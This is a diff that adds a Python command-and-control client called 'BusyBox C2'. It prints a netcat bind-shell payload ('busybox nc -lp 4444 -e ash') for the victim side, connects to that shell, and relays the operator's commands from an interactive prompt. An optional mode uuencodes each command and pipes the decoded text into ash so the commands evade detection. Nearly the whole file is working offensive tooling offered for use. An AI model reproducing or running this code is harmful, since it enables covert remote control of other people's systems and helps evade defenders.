@@ -1,0 +1,103 @@
+from pyfiglet import Figlet
+import socket, select, sys, time
+import subprocess
+
+def show_banner():
+    print(Figlet(font="slant").renderText("BusyBox C2"))
+
+def send_cmd(socket, cmd):
+
+    socket.sendall((cmd + "\n").encode())
+
+    data_parts = []
+    while True:
+        r, _, _ = select.select([socket], [], [], 0.2)
+        if r:
+            chunk = socket.recv(4096)
+            if not chunk:
+                break
+            data_parts.append(chunk)
+            sys.stdout.write(b"".join(data_parts).decode(errors="replace"))
+            sys.stdout.flush()
+        else:
+            break
+    if data_parts:
+        return data_parts
+
+def show_cmd_output(cmd_output):
+    if cmd_output:
+        sys.stdout.write(b"".join(cmd_output).decode(errors="replace"))
+        sys.stdout.flush()
+
+def cmd_obfuscation_ascii(raw_cmd):
+    cmd_to_get_cmd_ascii_version = 'printf ' + '"' + raw_cmd + '"' + ' | busybox uuencode - | sed -n "2p"'
+    #print(cmd_to_get_cmd_ascii_version)
+    ascii_cmd = subprocess.check_output(cmd_to_get_cmd_ascii_version, shell=True, text=True)
+    #print(ascii_cmd)
+    payload = "s=\"" + ascii_cmd.rstrip("\n").replace("`", "\`").replace("\"", "\\\"") + "\";printf 'begin 644 -\\n%s\\n`\\nend\\n' $s|busybox uudecode -o /dev/stdout|ash"
+    #print(payload)
+    return payload
+
+
+def main():
+    show_banner()
+
+    server_ip = "127.0.0.1"
+    server_port = 4444
+
+    payload = "busybox nc -lp " + str(server_port) + " -e ash"
+    
+    print(f"[*] Payload to execute: {payload}\n")
+
+    print(f"[...] Initialization of TCP connection to {server_ip}:{server_port}")
+    while True:
+        try:
+            s = socket.create_connection((server_ip, server_port))
+            print("[+] New connection !\n")
+            break
+        except KeyboardInterrupt:
+            exit(0)
+        except:
+            pass
+
+    s.setblocking(False)
+
+    prompt = " (busybox-c2)> "
+    options = []
+
+    try:
+        while True:
+            try:
+                cmd = input(prompt)
+
+                match cmd.strip().lower():
+                    case 'exit' | '/exit':
+                        break
+                    case '/obfuscation_ascii' | '/obf_a':
+                        options.append('obfuscation_ascii')
+                        prompt = " (busybox-c2)[+]> "
+                    case '/options_disable' | '/o_d':
+                        options.clear()
+                        prompt = " (busybox-c2)> "
+                    case '/options_show' | '/o_s' | '/options' | '/o':
+                        for option in options:
+                            print(f"{option} ")
+                    case _:
+
+                        if "obfuscation_ascii" in options:
+                            cmd = cmd_obfuscation_ascii(cmd)
+                            print(f"Executed command: {cmd}\n")
+                            #break
+
+                        cmd_output = send_cmd(s, cmd)
+                        #show_cmd_output(cmd_output)
+            except (EOFError, KeyboardInterrupt):
+                break
+            if not cmd:
+                continue
+    finally:
+        s.close()
+    
+
+if __name__ == "__main__":
+    main()
